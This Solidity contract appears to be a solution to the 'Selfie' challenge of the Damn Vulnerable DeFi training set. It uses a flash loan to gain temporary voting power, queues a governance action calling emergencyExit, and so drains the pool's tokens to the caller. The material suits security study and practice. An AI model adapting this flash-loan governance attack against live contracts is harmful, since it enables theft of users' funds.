// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfieExploit
 * @author scorpion9979
 */
contract SelfieExploit is IERC3156FlashBorrower {
    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable token;

    constructor(
        SimpleGovernance governance_,
        SelfiePool pool_,
        DamnValuableTokenSnapshot token_
    ) {
        governance = governance_;
        pool = pool_;
        token = token_;
    }

    function onFlashLoan(
        address initiator,
        address token_,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // Take a snapshot using the flash loaned tokens
        token.snapshot();

        // Execute the data payload
        (bool success, ) = address(governance).call(data);
        require(success);

        // Approve pool to spend flash loaned tokens for repayment
        SafeTransferLib.safeApprove(address(token), msg.sender, amount);

        // Return the expected callback response
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function exploit() external payable {
        pool.flashLoan(
            this,
            address(token),
            pool.maxFlashLoan(address(token)),
            // Submit governance action to drain funds from pool
            abi.encodeWithSelector(
                governance.queueAction.selector,
                address(pool),
                0,
                abi.encodeWithSelector(pool.emergencyExit.selector, msg.sender)
            )
        );
    }
}
